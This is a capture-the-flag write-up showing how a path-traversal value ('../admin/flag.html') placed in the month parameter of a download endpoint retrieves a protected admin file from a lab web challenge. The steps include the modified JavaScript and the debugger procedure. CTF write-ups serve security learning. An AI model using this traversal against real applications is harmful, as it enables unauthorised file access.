# Question
Link: http://employee-attendance.ihack24.capturextheflag.io/

Credentials: 
```
employee01:password
```
# Writeup
1. Ok, in this website, our target is `/admin/flag.html`
2. There is a bunch of Javascript on the main website.
```js
async function fetchData(month) {
	const response = await fetch('/data/' + month);
	const data = await response.json();
	return data;
}

async function displayData() {
	const monthSelect = document.getElementById('month-select');
	const month = monthSelect.value;
	const tbody = document.getElementById('employee-table').querySelector('tbody');
	tbody.innerHTML = ''; 

	if (month) {
		const data = await fetchData(month);
		data.forEach(employee => {
			const row = document.createElement('tr');
			row.innerHTML = `
				<td>${employee.employee_name}</td>
				<td>${employee.employee_id}</td>
				<td>${employee.attendance.days_present}</td>
				<td>${employee.attendance.days_absent}</td>
				<td>${employee.status}</td>
			`;
			tbody.appendChild(row);
		});
	}
}

async function downloadJSON() {
	const monthSelect = document.getElementById('month-select');
	const month = monthSelect.value;
	if (month) {
		window.location.href = '/download?month=' + month;
	} else {
		alert("Please select a month to download the data.");
	}
}

function logout() {
	window.location.href = "/";
}

```
3. Hmm, can I make it download the file for me?
```js
async function downloadJSON() {
	const month = '../admin/flag.html';
	if (month) {
		window.location.href = '/download?month=' + month;
	} else {
		alert("Please select a month to download the data.");
	}
}

```
4. Ok, I need to go to the` Sources>login.html` and set a breakpoint at line 87. Click the left side.
5. Press the Download JSON button
6. Continue to line 89 
7. Change the value of month in the console to `../admin/flag.html`
8. Continue the debugger. It should download the file.
9. After that, extract the file and the flag is inside.